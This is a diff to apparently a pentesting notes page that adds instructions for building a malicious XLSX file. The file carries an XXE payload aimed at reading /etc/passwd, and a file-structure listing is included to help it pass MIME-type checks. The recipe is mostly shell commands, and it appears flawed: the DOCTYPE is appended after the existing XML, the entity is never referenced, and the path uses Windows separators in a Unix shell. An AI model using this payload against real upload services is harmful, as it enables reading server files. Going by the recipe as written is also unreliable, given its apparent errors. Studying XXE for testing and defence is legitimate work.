@@ -13,4 +13,32 @@ Attacking a file generator: [[XSS#Server-side]]
 
 ## Microsoft file formats
 
-In addition to ZIP-vulnerabilities, these files can be exploited with XXE
+In addition to ZIP-vulnerabilities, these files can be exploited with XXE. 
+
+For a given `file.xlsx`:
+
+```
+unzip file.xlsx -d payload
+cd payload
+echo '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>' >> xl\worksheets\sheet1.xml
+zip -0 -r payload.xlsx .
+# debug
+# file payload.xlsx
+# zipinfo -1 payload.xlsx
+```
+
+XLSX files typically use DEFLATE and LZMA compression algorithms. MIME type checkers also look for the directory structure inside a file to distinguish ZIP from XLSX:
+```
+|-- [Content_Types].xml
+|-- _rels
+|    |--.rels
+|-- docProps
+|    |-- core.xml
+|    |-- app.xml
+|-- xl
+|    |-- _rels
+|    |    |-- workbook.xml.rels
+|    |-- workbook.xml
+|    |-- worksheets
+|    |    |-- sheet1.xml
+```
